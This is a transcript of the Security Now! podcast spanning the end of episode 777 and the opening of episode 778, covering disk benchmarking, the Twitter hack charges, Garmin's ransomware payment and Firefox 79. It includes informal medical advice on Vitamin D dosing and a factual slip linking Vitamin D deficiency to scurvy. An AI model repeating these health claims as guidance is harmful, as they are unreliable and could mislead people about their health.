In their note they said rebooting is a likely indicator that they've been patched, yet only 27 of the 398 that are detected within Fortune 500 companies appear to have been patched and rebooted.  So again, it's not possible to say this too often.  Nothing is more important than making sure you've got open lines of communication to the software and hardware vendors of the equipment you're using and to have somebody who's on, like, absolutely watching this stuff.  This cannot go to some neglected email account that the IT team checks on every week.  One week is no longer fast enough.  It should be clear to everyone by now that a vulnerability is no longer a surprise exception.  Just ask Microsoft on any Patch Tuesday.  And I can imagine that Dynamic Update and Patch Management could become a job title.  I wouldn't be surprised if it does.



One piece of miscellany, and I can't vouch for this.  It's called Bloatbox.  Debloating Windows 10 after installation and before getting down to any serious business has become something of, like, what any serious user needs to do.  Every time I install Windows 10, and I've got a bunch of installations around now doing different things, stripping all of the junk off of it is really what you have to do before you sit down to get any serious work done.  Over time, I've assembled a few tools to do this.



I know, Leo, you've talked about some PowerShell scripts.  I have them, too.  And basically they amount to some PowerShell commands with wildcards for "please remove everything."  And then there are a few extra things because, for example, things like Connect, which is extra stubborn and needs a little extra coaching in order to get it to leave.  But so far the available utilities for accomplishing these tasks have left me unimpressed.  I'm hoping that this one will be different.  It's not clear.



And again, I just wanted to put it on everyone's radar.  It's a newly released open source tool called Bloatbox.  It's up on GitHub.  If you just google "Bloatbox," the first link is to it.  I've not had the occasion to use it yet, so I'm not vouching for it.  And one concern is that it might be digging a bit too deep.  So don't tell your unsophisticated users about it.  In the sample screenshot that you've got on the screen right now, Leo, I see options to remove various versions of Microsoft.NET.Native.Framework and the Fluent XAML Theme Editor and more.  Those are things that probably ought to remain where they are.  So I would advise caution and only remove things that are recognizable, that are in your face and are annoying you.



Still, Bloatbox might be worth a look.  I'll be on the lookout for any Twitter feedback about it from any of our listeners who do check it out.  And the next time I'm facing a Start Menu loaded with flippy animated tiles pushing Candy Crush Soda Saga, I will definitely give it a try myself, and I will report back what I find.  You know, I've been tempted to do something to fix this, but I know that our listeners would rather have me continuing to work on getting SpinRite out the door.



I did have a piece of errata that I thought was interesting and definitely worth sharing from a David A. Wheeler.  He tweeted, I guess he DM'd, he said:  "Hi.  You've been claiming in Security Now! that the CVE number after the year is in sequential order."  He says:  "That has not been true for a long time.  There are too many CVEs for one organization to assign them all.  So there are now many CVE Numbering Authorities known as CNAs, each of which is given a block of integers to assign.  So it's no longer as simple as number after year indicates order or indicates the number of vulnerabilities this year."



So David, thank you for bringing that up.  We know that we do have a phenomenal number and that the total count is going up rapidly.  But good to know that, if you were pulling CVEs from somebody who hadn't issued many and got a low number block, that could be happening late in the year, even though the number was low.  So thank you.



LEO:  On we go, Mr. Steve Gibson.



STEVE:  So this benchmarking software has evolved into a surprisingly accurate measure of performance.  It's a bit like having access to a high-resolution microscope, and as a result we've been discovering some very interesting and surprising things.  I have tables in the show notes which our listeners will probably want to take a look at.  You might want to stick them onscreen, that first one.  That's the result of seven separate runs of the benchmark against a system containing a 10TB Seagate spinning drive and a half-a-terabyte Crucial SSD.



Now, remember that the earliest hard disk drives maintained either 17 sectors per track, which were MFM, or 26 sectors if they were RLL.  That's why they got that 50% increase in density, by using run-length limited encoding.  So that was the number of sectors per revolution.  And they had the same number of sectors around the innermost cylinder as around the outermost.  And we've all sort of seen the original pictures of a pie-slice hard drive, where the slices represent the sectors.  But that meant that the bit density of the bits around the inner cylinder set the bit rate for the drive, that is, the maximum density for the drive, and that the same number of bits were more greatly spread out around the outer cylinder because of course the outer cylinder has a much greater circumference than the inner cylinder.  That clearly wastes space.



So all of today's modern drives vary the number of sectors around the track, depending upon the track's length.  And that varies with the track's position on the drive, of course.  So as a consequence, a modern hard drive's data transfer rate will also vary with the position of the track on the drive.  So this chart was the result of, as I said, okay, one, two, three, four, five, six, seven runs of this benchmark on a 10TB Seagate drive.



In order to get a sense for this, I recently added position dependence into the benchmark.  But what was initially happening was I using a random position.  And people were saying, hey, you know, I'm getting different results every time I run the benchmark.  And I of course knew why.  But I thought it would be interesting to have the benchmark take readings at different locations in the hard drive.  And as we can see from the table above, the position where the benchmark is taken greatly affects the data transfer rate.  I'm measuring at zero, at 25% into the drive, at 50% into the drive, 75%, and 100%.  So basically five places at quarter spreads.  And as we would predict, the actual data transfer rate drops off as we move in toward the inner cylinders.



In the case of this 10TB Seagate drive, the back of the drive runs at about 46% of the throughput compared to the front of the drive.  And so this suggests that for a spinning drive, moving the most often-accessed data to the front can more than double the drive's actual throughput, compared with data located at the end of the drive.  And notice something else in that table that I'm quite proud of, and that is the remarkable run-to-run repeatability of the benchmark's results.  I mean, in the case of the 50% point, they're all 205.3 megabytes per second; the 75% all 170 megabytes per second, with one of them at 169.6.  And at the 100% point, 112.7 megabytes per second, with two of them at 112.6.  So basically four digits of accuracy from the benchmark, which is what, first of all, lets us believe the numbers, and also it becomes sensitive enough for us to see things that we otherwise would not have noted.



Which takes us to the second chart showing on that same system seven runs of the 512GB Crucial SSD.  We see the same sort of intertest repeatability.  Basically the seven successive tests are identical.  But something that's really interesting that I first noted here and that a lot of the testers have been noting is that the front of the SSD is significantly slower than later in the SSD.  What we think this shows is there is fatiguing occurring at the front of the SSD which is reducing its performance.  We know that there is active write-leveling that goes on in order to swap regions around so that one region that is being written often doesn't die.  Instead, the SSD controller is remapping the regions of the SSD transparently.



It's not something that there's any UI for at the interface to the drive.  But what we believe this means is that this wear leveling is not global in nature.  It's local in nature.  So there is a limit to the reach of the leveling across the drive.  I think the most consistent performers we've seen have been Samsung SSDs, you know, the high-end ones, the 560 and, no, I guess it's...



LEO:  850, 860, and 870, yeah.



STEVE:  Yeah.



LEO:  EVOs.



STEVE:  Yeah, they really do seem to be doing a better job.



LEO:  Good, because that's the ones I buy.



STEVE:  Yeah, yeah.  And I just think I believe in Samsung's technology.  And then in this last table is something else that we've seen which is really interesting.  So we've got a super accurate throughput benchmark giving us four digits of accuracy.  We had one of our testers who has a system with four identical 2TB Seagate drives run the benchmark three times.  So he produced three sets of benchmarks for each drive.  This table he rearranged them by drive, so it's three benchmarks for the first drive.  And in fact in the table you can see the "P" column is the SATA port that the drive is on.  The "S" is the SATA speed.  So SATA III, SATA II.



And in fact we had one tester didn't know it, but he had a SATA III-capable SSD on a SATA II port that he'd never noticed.  The benchmark showed him that this SATA III device was on a SATA II port.  And in fact the next version will explicitly notify you if you have that kind of speed mismatch.  He moved his SSD from SATA II to SATA III and more than doubled the measured throughput for that device.  So that was a nice little benefit.



But look at these numbers in this last chart.  We see the four groups of three for each of the drives.  The retest of a given drive shows almost identical results.  But these four identical drives are showing differing performances at the zero, the 25, the 50, the 75, and the 100% points.  For example, one of them shows right at the front 166 at the zero.  Another one is 174, another one is 167, and another one is 158.  So they're the identical drive.  The retest is the same, but the three drives differ.  And they differ differently across their area.



So what could account for the precise performance of identical drives staying consistent for each drive, but differing from the others?  What differs from one drive to the next?  What has always differed from one drive to the next?  The number and the location of physical surface defects.  This benchmark is revealing the subtle transfer timing variations which result from physical sector remapping around the defects.  The location and number of defects differs from one drive to the next.  No two are going to be the same.  But of course they remain fixed for any single drive.  At the moment I'm performing the benchmark by taking 32 consecutive back-to-back 32MB transfers of 65536 sectors each, so that's 1GB.  So I'm going a 1GB read at the beginning, a 1GB at the 25% point, 1GB at the 50, 1GB at the 75 and at the 100.



I've proven that I'm eliminating all intertransfer overhead.  No revolutions are being lost between blocks.  So I'm streaming data off the drive at its maximum theoretical performance.  And of course I developed all this for SpinRite because this is what's going to make SpinRite 6.1 scream.  And for the benchmark, I've achieved a timing resolution down to the hundreds of picoseconds of accuracy, which is how I'm able to get the actual throughput readings so just dead on and repeatable, run after run.



But I mentioned that I have an idea for an improvement.  Because these timing irregularities have raised some interesting questions, by next week's podcast, although I promise not to take up so much time, I will have changed the test to 33 consecutive back-to-back transfers, adding one.  And I plan to snapshot the exact instant where the interblock of the 32 interblocks occurs so that we can more granularly see how each of the 32MB transfers flow.  And I'm going to use that first transfer, that 33rd in front, so that I can discard the first one.  That way the benchmark will be able to eliminate any head seek time and rotational latencies from the start of each block, which I'm not eliminating now.  So that way the benchmark won't start timing until the first block is discarded, and that 32MB  has been read.



So as I've mentioned before, the idea of creating a mass storage benchmark like this started out kind of as a bit of a Trojan horse, you know, an inducement for our listeners to obtain some value in return for their effort of formatting and booting a USB stick to run the benchmark on their various hardware systems.  In the process of doing that, they would be verifying for me that SpinRite's new suite of bare metal, no BIOS drivers, of which this AHCI driver is the last and final that I need to develop, are working for them, and thus proving that SpinRite will work for them, too.  But it's looking like this hyper-accurate storage benchmark is going to wind up providing some very interesting information for its users.  So my original plan for a companion web forum was to help in managing any problems that people had with the benchmark, but I think we're going to also need a place to discuss people's interesting findings as they use this.  So anyway, I just thought our listeners would find that interesting.



LEO:  Cool.



STEVE:  Very, very cool timing results.



LEO:  Yeah.  And a very cool show.  Thank you, Steve.  We do Spin the Security Now! Bottle every Tuesday, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  If you want to tune in, you can watch us make the show live at TWiT.tv/live.  There's audio and video streams there.  Steve has copies of the show, though.  You can always download those at his website.  He's got 16Kb audio, 64Kb audio, and transcripts, a really nice feature.  That's all at GRC.com.  While you're there, pick up SpinRite, the world's best hard drive maintenance and recovery utility.  Keep up on the updates on SpinRite 6.1 as he works on it.  Participate if you want.  In fact, if you pick up 6.0 now, you can participate in the development of 6.1 and be part of the team.  That's all at GRC.com, along with a lot of great freebies, as well.



On-demand versions of the show at our website, as well, TWiT.tv/sn.  We've got 64Kb audio and video.  We also put it up on YouTube.  You can watch it there, if you want, in a variety of formats to fit the device you're watching.  And of course if you have a podcast application, the easiest thing to do would be just subscribe.  That way you get it automatically the minute it's available every Tuesday afternoon.  Steve, we'll see you back here for 778.



STEVE:  And you know, Leo, over the course - we're coming in here on the end of Year 15.  That happens next month.



LEO:  Yes.



STEVE:  And it occurred to me that over the course of the last 15 years the world has changed a lot, and there may actually be a reduced need for 16Kb audio now.



LEO:  Does anybody download it?  You must have numbers.



STEVE:  Yeah, oh, yeah, yeah.  We do get downloads.  I actually bounce them through - I guess I'm still bouncing them through Podtrac because you guys are...



LEO:  Oh, okay.  No, we don't use them anymore.



STEVE:  I think the links still work.



LEO:  Actually, well, that's an interesting point.  We have new redirects.  I don't suppose anybody - Patrick, if you're listening, make sure you get Steve the redirects.  We don't use Podtrac anymore.



STEVE:  Yeah.  All of the high resolution actually just go to you.  I'm using the same link you guys use.



LEO:  It's just for the 16, huh.



STEVE:  Yeah.



LEO:  Oh, okay, okay.  Well, actually I'd be really curious to see.  Probably, probably doesn't affect the results. 



STEVE:  Probably not a big demographic, no.



LEO:  Yeah.  We'll send you the new redirects because we have different redirects these days.  Thank you, Steve.



STEVE:  And just so all of our Linux listeners know, I'm not  recommending rwxrwxrwx.



LEO:  Never.



STEVE:  That is not a good idea.  Yeah, that's not the way you want to leave your...



LEO:  The only time I ever do that 777 is if I'm so frustrated and just go, chmod -R 777.  Do it to everything.  And then I can figure out after the fact.  Actually, there's some programs, it's interesting, GPG, GNU Privacy Guard, which is the open source PGP, will complain - I think SSH will, as well - if it has [crosstalk] sessions on folders and files, which I think is really great.  Yeah, yeah, that's a nice feature.  Thank you, Steve.  We'll see you next time on Security Now!.



STEVE:  Okay, buddy.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#778

DATE:		August 4, 2020

TITLE:		BootHole

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-778.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we touch on the recent update of Firefox to v79.  We check back on the Twitter hack with the news of the identity of the accused perpetrators.  We have more information about the Garmin ransomware hack.  We look at the behavior of another disgruntled vulnerability researcher and consider another aspect of the ethics of vulnerability disclosure.  We examine Zoom's bug of the week and the consequences of Microsoft's removal of all SHA-1 signed downloads, and note that QNAP NAS devices are still suffering from real trouble and neglect by their owners.  I'm going to check in with the SpinRite work.  Then we take a look at the week's biggest security event - the discovery of a boot security bypass for Linux.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Firefox 79 is also here.  Steve has some new features.  We'll talk about the Twitter hack.  They got 'em, three kids, one 17 years old.  We'll also talk about a real problem with security with Tor that they don't really even seem to care much about, and a flaw with GRUB2.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 778, recorded Tuesday, August 4th, 2020:  BootHole.



It's time for Security Now!, the show where we cover the latest in the security world with Mr. Steve Gibson.  Hi, Steve.



STEVE GIBSON:  Hey, Leo.  Great to be with you again for our "closing in on the end of year 15" Episode 778.  And I think it'll be 780.  I think about two weeks from now is when we lap ourselves, closing out Year 15 and beginning on 16.



LEO:  Now, forgive me, but I told my team Steve doesn't want a cake or balloons or confetti or anything like that.



STEVE:  Correct, yes.



LEO:  Steve's like me.  We don't celebrate these anniversaries.



STEVE:  My 65th birthday occurred toward the end of March in the middle of COVID land.



LEO:  We didn't even know.



STEVE:  And I thought, this is the weirdest birthday ever.



LEO:  Yeah.  Yeah, mine's in a couple - a year from November.  Wow.



STEVE:  You are correct.  No cakes, thank you very much.



LEO:  No cakes, no more, unh-unh.  Let's just pretend nothing's happening.



STEVE:  So we're going to talk about BootHole, which is a little reminiscent of Spectre and Meltdown inasmuch as the cure is in some cases worse than the problem, as we'll see.  But we're going to start by talking about the recent update to Firefox 79, one sort of okay new feature, not much else changed.  We're going to check back on the Twitter hack with news of, well, with news of the identity of the accused perps.  And that's "alleged" identity because we don't know for sure.  The so-called "mastermind" is a juvenile, so we're respecting that.



We also have more information about the Garmin ransomware hack.  Some additional information has come to light, primarily thanks to BleepingComputer's digging and their access to some insiders who've been feeding them some interesting tidbits.  We're also going to take a look at the behavior of another disgruntled vulnerability researcher and consider some aspects of the ethics of vulnerability disclosure that we haven't really talked about before.



We're going to examine what has now become Zoom's bug of the week, and the consequences of Microsoft's removal of all SHA-1 signed downloads from their site.  Unless you're a bit of a packrat, that could pose some problems.  Also QNAP NAS (Network Attached Storage) devices, are still suffering from escalating real trouble and neglect by their owners.  We'll touch on that.  I'll check back in with a little bit of update on my ongoing work with SpinRite and sort of deal with some of our listeners' questions quickly.



And then we're going to take a look at what is arguably, or I guess inarguably?  I don't know.  No one's arguing about it, the week's biggest security event, which is the discovery of this boot security bypass for Linux, which was named BootHole by its two discoverers.  Oh, and just an interesting Picture of the Week that I just - I don't want to belabor the point; but, boy, it's a rather compelling graph that I wanted just to make sure our listeners were aware of.  So I think another great podcast for our listeners.



LEO:  As always, Mr. Steve Gibson.  And I like this Picture of the Week.  This sounds really good.



STEVE:  So our longtime listeners certainly know that I sort of glommed onto the potential importance of Vitamin D years ago.  I surprised you one Tuesday, or maybe we were back recording on Wednesdays then.  I don't remember.



LEO:  Probably, yeah, yeah.



STEVE:  By, like, saying, well, we're not going to talk about security.  We're going to talk about something different.  And anyway, of course that was the now famous Vitamin D podcast [SN-209] where I went through all the biology and what appears to be the nature of the importance of it.  I also talked about it early this year, at the beginning of COVID, because it's known to have an important intersection with immunity.  And this is a year when we need all the immunity we can get.



The problem, of course, is that it almost costs nothing.  A strong proper dose for a year for a person is like $15 for 360 "little drops of sunshine," as I call them.  Anyway, the point is that, because it costs nothing, it's difficult to get money for research.



LEO:  No big drug companies getting rich on this, yeah.



STEVE:  Exactly.  This is, yeah, you're not having the White House funding the production of Vitamin D.  We already have, you know, you could argue you get all you need from the sun, but there actually is some correlation between the amount you have in your bloodstream and your proximity to the equator.  So that's one factor.



LEO:  That makes sense, yeah.



STEVE:  But 20 different groups of patients who, as a consequence of this past year of COVID-19 health crisis, happened to have their serum Vitamin D levels tested, were pulled together in sort of an ad hoc study.  I have the link in the show notes to the source PDF of which this is just one of many charts.  But this is the most dramatic of them.  This shows their correlation - and as we know, correlation is not causation, but this is, if nothing else, eye-opening - that correlates from these 20 studies whose results were aggregated.



It shows first of all in this sort of bluish line that there was no age difference over the span of Vitamin D concentration.  It's pretty much 60 to 65 years of age, regardless.  So age wasn't a factor here.  But the red line shows a breathtaking correlation, given all the caveats, studies, varying levels of control.  Obviously this is not a random sample.  These are people that were already in trouble such that they had their blood drawn and so forth.  So with that understanding, showing a very clear connection between the measured Vitamin D concentration and their ultimate consequences, that is, in this case the COVID-19 death rate as a function of Vitamin D.



So enough said.  Vitamin D is good.  Do your own independent research.  If you're interested, click the link to the PDF.  All the information about how this data was gathered is there.  And at the end is a whole bunch of additional backup material from the NIH and other health organizations to substantiate it.  So just wanted, again, not to spend any more time on this, but this was very powerful information.  For what it's worth, I just didn't want it to go unobserved.



LEO:  And what do you do?  How much Vitamin D do you take?



STEVE:  5,000 IU a day.



LEO:  That's what I'm doing, too, yeah.



STEVE:  Yup.  I think that, you know, if you're uncomfortable with that, maybe 4,000.  But the RDA is 400, and that just doesn't get you off the ground.  That's not going to do it.  I mean, it will prevent you from dying of scurvy and some sort of acute Vitamin D shortage.  But it's very different, I mean, and that's one of the problems with the RDA is it was - we call it the "Recommended Dietary Allowance."  It was meant to be the minimum you need of different things to keep you from having disease as a consequence of a shortage.  There's a big margin between what's enough to keep you from dying and what you should have for brimming health.



LEO:  There's always, we've always known Vitamin D was, you know, you get rickets if you don't have Vitamin D.  That's why they put it in milk as a supplement.



STEVE:  Correct.



LEO:  So we've always known that.  But there seems - go listen to Steve's whole show on Vitamin D because it really is an eye-opener.  And this isn't the only place I've seen this kind of indication that having a good Vitamin D level, not a deficiency, anyway, is important for COVID survival.



STEVE:  Right.  And in fact I'm glad you said that because I am, you know, I'm not wanting to talk about it all the time.  But I, too, am constantly seeing in the mainstream press is this or that study saying about connecting Vitamin D levels to COVID outcomes.  So when I finally saw this report that pulled it all together, and this rather breathtaking chart, I thought, okay, I need to take a moment to - and the competition for today's Picture of the Week was the BootHole logo, which is just wonderful.  But we've got that down at the end.



LEO:  Is it a boot with a hole?  Okay, we'll get to that.



STEVE:  A boot with a big hole, yes.  And a worm.



LEO:  Which Vitamin D do you take?  Vitamin D3?



STEVE:  Yes.  You want D3.  You know, Doctor's Best, NOW...



LEO:  I take NOW, yeah.



STEVE:  Anybody who - yeah, in fact NOW is actually what I take.  It's a little bottle because these things...



LEO:  Oh, they're tiny little pills.



STEVE:  Even for people, yes, even for people who are not pill takers, this will not be a problem.  It's a little tiny bit of a hormone, because it's not actually a vitamin, that is very diluted in olive oil because it is fat-soluble.  You do not want to take more than 5,000 IU a day unless you're having your blood watched by a doctor.  Back when we talked about it, Vitamin D wasn't even being tested.  And now...



LEO:  Yeah, my doc tests it.



STEVE:  ...because the mainstream medical community is beginning to catch on, they're actually taking a look at it.



LEO:  Yeah, my doc tests it.  And it's four cents a pill, the one I looked at.



STEVE:  Exactly.



LEO:  It's not expensive.



STEVE:  I mean, exactly.



LEO:  Okay.



STEVE:  So, yes, yeah.  I mean, if you wanted to do one thing for the health of yourself and your family, I would say Vitamin D at a useful level.  Oh, and really young kids ought to probably take less, maybe 2,000 IU.



LEO:  Because it's the old folks who don't get any sun and don't  convert it very well with their skin.  Kids can go out and get some sun, and they'll make their own.



STEVE:  Yes, yes.  Okay.  So no big news on the Firefox front.  The biggest new feature is a credential export which was added to Firefox's built-in Lockwise password manager.  This exports the Firefox database into a CSV formatted text file, which you could then drop into a spreadsheet or import it into some other password manager, which is sort of why they say they did this.  And of course it goes without saying that while exported in text form, it's readily discoverable by anyone or anything scanning your machine.  So if you were to do that, storing it in a password-protected 7-Zip archive, which I think is probably the best of the free Zip things, 7-Zip is very popular.



LEO:  And that's good protection?



STEVE:  Yes.



LEO:  Because for a while the password-protected Zip files were not so strong.  But this is good now?



STEVE:  Yes, they were a joke.  Yeah, 7-Zip did it right.  They derive a 256-bit AES key from a password-based key derivation function which uses a high iteration count for brute forcing delay, and we're going to be talking about brute forcing here before long because it's another mistake that Zoom made, to run an SHA-256 hash.  So you do need to pick a good password.  But if you do that with 7-Zip and its encryption, you should be safe to keep your passwords exported in that encrypted form.  And I'll just note that I'm still using LastPass under Firefox because I also use it under Chrome and under Edge and under Safari and across all platforms.  So, you know, it's worth noting that Firefox has a built-in password manager, but maybe as a backup it would be useful.  So anyway, that's the news on Firefox 79.  Not much there.



So I heard you talking about it on MacBreak, and so I just wanted to touch on this.  We have learned more about who's behind, who's believed to be behind the Twitter hack.  And, you know, not some powerful state-sponsored cybercrime gang; just a, we believe, a 17-year-old kid.  His name is all over the tech press.  I heard you not wanting to say it on MacBreak, Leo, but I do have it in the show notes.



LEO:  It wouldn't be hard for somebody to find it.  I mean, you know, I come from the school of journalism where you don't say the names of minors who are accused of crimes.  But apparently nobody else does that.



STEVE:  Yeah.  The local Florida news channel WFLA...



LEO:  They doxed him right away.



STEVE:  Yeah.  They outed him as Graham Clark from Tampa Bay, Florida.



LEO:  They also published a suitably creepy picture of him.



STEVE:  I know.  In fact, before I reduced it in size, and I actually had in the show notes, he looks a little bit like Spock.



LEO:  Oh, he does.



STEVE:  Because he's got kind of a pointed ear.  And he is a little bit creepy.  And it's interesting, too, that his NIC is Kirk.  So, you know?



LEO:  Oh.



STEVE:  Maybe he does have pointy ears.



LEO:  Yeah, yeah.



STEVE:  So people thought, you look a little Spock-like.  Anyway, the sad thing is this guy's life is now seriously spocked-up.



LEO:  Yeah, yeah.



STEVE:  He's been charged with 30 felonies relating to computer communications and organized fraud for scamming hundreds of people using compromised accounts.  According to a press release from Hillsborough State Attorney Andrew Warren's office, this guy, Graham Clark we believe, now faces 30 felony charges.  So we have one count of organized fraud involving more than $50,000; 17 counts of communications fraud of over $300; one count of fraudulent use of personal information in amount over $100,000 or 30 or more victims; 10 counts of fraudulent use of personal information; and one count of access to computer or electronic devices without authority and scheming to defraud.



So in total, 30 counts of felony charges.  All of those are felonies.  So, I mean, I do feel like, unfortunately, there's sort of a bit of overreaction.  I mean, I get it that this was not good, and certainly the law enforcement wants to send a message, like don't do this, even if you can.



The initial announcement didn't indicate whether Clark had any partners in crime.  But a few hours after the press conference announcement, the world learned that the U.S. DOJ had also filed charges against two other suspects believed to have helped Clark in this hack.  The first of those was identified as Mason Sheppard, who's known as "Chaewon," 19 years old, living in Bognor Regis in the U.K.  And the other is identified as Nima Fazeli, also known as "Rolex," a 22 year old residing in Orlando, Florida.



U.S. Attorney Anderson said:  "There is a false belief within the criminal hacker community that attacks like the Twitter hack can be perpetrated anonymously and without consequence.  Today's charging announcement demonstrates" - thus I think an example is being made - "that the elation of nefarious hacking into a secure environment for fun or profit will be short-lived.  Criminal conduct over the Internet may feel stealthy to the people who perpetrate it, but there is nothing stealthy about it.  In particular," he said, "I want to say to would-be offenders, break the law, and we will find you."



LEO:  Oh, please.  Exactly the kind of thing hackers go, hah.  Hah, hah.



STEVE:  Uh-huh, yeah, thumb their nose.  



LEO:  Yeah.  That's going to really scare me.  I remember when I was a teenager.  



STEVE:  Yeah.  And in fact, Leo, this did - you know, I was always a good kid.  But oh, you know, to be 17 and have this crazy...



LEO:  Yeah, you do dumb things.



STEVE:  ...network in front of me, yeah.



LEO:  Yeah, yeah.



STEVE:  So Twitter...



LEO:  He was probably fairly clever because, well, go ahead.  Because the way he did it was kind of interesting.



STEVE:  Yeah.  So for their part, Twitter disclosed a bit more about the nature of the attacks.  They said that the phone-based social engineering attack allowed the attackers to obtain the credentials of a limited set of employees which then made it possible to gain access to Twitter's internal network and support tools.  Although not all of those employees who were initially targeted had permissions to use account management tools, the attackers, apparently actually just Graham, was able to use their credentials to then access Twitter's internal systems and gain information about Twitter's processes.  That expanded knowledge then enabled the attackers to target additional employees who did have access to Twitter's privileged account support tools.



Reuters also had reported something that I had not seen elsewhere, which was that, as of earlier this year, more than a thousand Twitter employees and contractors had access to Twitter's internal tools and could change user account settings and hand control over to others.  A thousand.  And this was according to two former Twitter employees.  Well, as we know, such widespread access makes it difficult, if not impossible, to defend against the sort of hacking that occurred.



So I did see some Disqus conversations.  I'm sorry, Discord conversations.  I read everything I could find, and ZDNet provided the most detail about the hack, including those, as I said, some Discord chat logs where Graham is seen soliciting the participation of the other two.  He claims to work for Twitter and then offers to prove it by modifying their Twitter accounts.  He also provided his bitcoin address.  And Leo, I heard you mention on MacBreak Weekly the rather head-slapping fact that he provided his driver's license.



LEO:  You have to at Coinbase to set up an account.



STEVE:  Yes.  And so he sold them access to some high-value Twitter accounts such as @xx, @dark, @vampire, and @drug.  Anyway, the link with all the details is in the show notes, for anyone who's interested.



So my take on this is that it's another example of what you might call "managerial inertia."  And it was kind of natural.  Let's remember that when Twitter was born, it wasn't initially taken very seriously.  You know, it had that ridiculously limited text-only, patently insecure messaging of 140 characters max.  I remember thinking, wait, 140 characters?  That's it?



LEO:  Yes.  Those were the days.



STEVE:  But obviously over time Twitter's importance has grown dramatically.  As we know, heads of industry and state use Twitter to reach their followers, including of course our U.S. President, who uses it to directly reach each one of his 84.5 million followers, multiple times per day.  And more than likely, Twitter also didn't take itself very seriously at the start.  You know.  And as we've noted, there never really was any clear plan for how this free service was supposed to make any money.  But over time, and very gradually, that changed.



So my point is, Twitter's importance doubtless crept up on it.  Over the course of many years, Twitter slowly grew into a truly important global communications facility.  As we know, it didn't start out as one, and it clearly is one today.  That didn't happen all at once.



So I think this security breach is mostly a consequence of Twitter doing things the way it always had.  And of any change to the status quo, you know, that occurred, the management just lagged behind.  So my take on this is that this ultra high-profile security breach was probably the best thing that could have happened to Twitter.  It did not actually result in a huge amount of damage.  It has ruined a couple kids' lives, unfortunately.  It'll be interesting to see what the sentencing is once this works its way through the courts.



But it was obviously, you know, if as Reuters reported at the beginning of the year, there were a thousand people who could do this, both inside and outside of Twitter, then this is a very much-needed wakeup call which was delivered probably in the nick of time.  You know, we've got a very high-profile election coming up here in three months.  We need the Internet to not betray the interests of the U.S. electorate.  So I'm glad this happened, frankly, because it's clear that Twitter needs to get their act together, that they haven't been taking themselves as seriously as they need to.  And again it's, you know, too bad for these young people.



The Garmin hack.  Lawrence Abrams, BleepingComputer, as we know, has always had a strong interest in ransomware.  So I'm not surprised that his coverage of the Garmin ransomware attack was the most detailed of any I've seen, nor that he's had access to some Garmin insiders who have reached out to provide him some extra tasty bits.  Among other things, an employee inside Garmin informed him that the initial ransom demand was for $10 million.



LEO:  Whoa.



STEVE:  We don't know - yeah.



LEO:  Holy moly.



STEVE:  $10 million.



LEO:  Okay.



STEVE:  We don't know what ransom was finally paid, but it seems more certain than ever that Garmin did pay up.  Lawrence wrote:  "After a four-day outage, Garmin suddenly announced that they were starting to restore services, and it made us suspect that they paid the ransom to receive a decryptor."



Then last Saturday Lawrence posted:  "Today, BleepingComputer gained access to an executable created by the Garmin IT department to decrypt a workstation and then install a variety of security software on the machine.  Since WastedLocker" - that's the ransomware - "is an enterprise-targeting ransomware with no known weaknesses in their encryption algorithm, a decryptor cannot be made for free."  And remember that BleepingComputer has been sort of a focal point for the less-than-well-designed ransomware, where mistakes were found in the encryption which allowed for the creation of a no-charge decryptor, and those have been organized and can be found through BleepingComputer.



So, he said:  "To obtain a working decryption key, Garmin must have paid the ransom to the attackers."  Then this is where he said:  "It's not known how much was paid; but as previously stated, an employee had told BleepingComputer that the original ransom demand was for $10 million.  When extracted, this restoration package" - this is the one that they received a copy of that had been prepared by Garmin's IT department - "this restoration package includes various security software installers, a decryption key, a WastedLocker decryptor, and a script to run them all.  When executed, the restoration package decrypts the computer and then preps the machine with security software.



"Garmin's script contains a timestamp of July 25, 2020, which indicates that the ransom was paid either on the 24th or 25th.  Using the sample of WastedLocker from the Garmin attack" - that is, the actual ransomware from the Garmin attack - "BleepingComputer encrypted a virtual machine and tested the decryptor to see if it would decrypt our files."  He said:  "In our test, the decryptor had no problems decrypting our files."



So what was interesting was that the package received by BleepingComputer included references to both the cybersecurity firm Emsisoft, E-M-S-I-S-O-F-T, Emsisoft, and the ransomware negotiation service Coveware.  When Bleeping Computer subsequently reached out to Coveware, they were told that they do not comment on any ransomware incidents reported in the media.  And similarly, Emsisoft told BleepingComputer that they could not comment on any cases; that they create decryption tools and are not involved in ransom payments.  Brett Callow, a threat analyst at Emsisoft, said:  "I cannot comment on specific cases.  But generally speaking, Emsisoft has no involvement whatsoever in negotiating or transacting ransom payments.  We simply create decryption tools."



Okay.  Now, that's interesting news.  So it might seem odd for a reputable security firm such as Emsisoft to have anything to do with ransomware.  But they have an interesting angle.  As we know, the decryption side of the ransomware mess sometimes receives much less attention from the bad guys who need to create the decryptor than the encryption side.  Consequently, the decryptors have tended historically to be buggy, to crash, or to for some reason fail to fully undo the damage that they had originally done, despite having received a valid key.



So that's where Emsisoft comes in.  They reverse engineer questionable ransomware decryptors, for which the decryption key is known, to create a more robust and reliable decryptor for a victim's systems.  Emsisoft's ransomware recovery services page states:  "If the ransom has been paid, but the attacker-provided decryptor is slow or faulty, we can extract the decryption code and create a custom-built solution that decrypts up to 50% faster with less risk of data damage or loss."  So this also explains why the decryption package Garmin finally used also contained legitimate security software.  That extra security software, along with an improved decryptor, may have been provided by Emsisoft, or may have been put together by Garmin's IT.



And of course, as we mentioned last week, now that Evil Corp has been attributed as the creator of Wasted Locker and has been placed on the U.S. sanctions list for using Dridex to cause more than $100 million in financial damages, paying this ransom could lead to hefty fines from the government.  So due to these sanctions, sources familiar with Coveware have told BleepingComputer that the negotiation company has placed WastedLocker on their own restricted list starting in early July and will not be handling negotiations for related attacks.  So it does look like Garmin paid a ransom.



LEO:  That's too bad.  $10 million.



STEVE:  $10 million.  Yeah.  That was the initial demand.



LEO:  Correct me if I'm wrong.  I understand how hard it is to remediate after a ransomware attack.  But if you have a backup of your data, there would be no reason to pay the ransom; right?



STEVE:  Right.



